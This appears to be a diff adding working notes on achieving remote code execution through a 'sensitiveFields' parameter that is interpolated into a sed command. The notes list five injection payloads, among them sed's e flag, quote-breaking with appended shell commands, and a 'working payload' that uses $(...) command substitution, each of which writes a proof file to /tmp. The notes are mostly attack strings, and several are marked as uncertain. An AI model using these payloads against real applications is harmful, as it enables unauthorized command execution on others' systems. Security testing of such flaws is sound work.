@@ -1,0 +1,25 @@
+Payload for sensitiveFields parameter to achieve RCE:
+
+Method 1 - Using sed's e flag (GNU sed):
+/e echo 'hello' > /tmp/proof
+
+Method 2 - Pattern that might break sed structure:
+.*'; echo 'hello' > /tmp/proof; echo '.*
+
+Method 3 - Most reliable - Exploiting the unescaped tempFile:
+This requires controlling the tempFile path, which is harder.
+
+Method 4 - Using CSV content + search pattern combination:
+Upload CSV with: test'; echo 'hello' > /tmp/proof; echo 'end
+Search for: test
+
+The key insight is that the command becomes:
+sed -i 's^'test'\; echo '\''hello'\'' > /tmp/proof; echo '\''end'^REDACTED^g' /tmp/file
+
+This might still be escaped properly.
+
+Method 5 - The working payload (requires GNU sed with -e flag):
+Use this exact string as sensitiveFields:
+.*'$(echo 'hello' > /tmp/proof)'.*
+
+This exploits command substitution within the sed pattern.
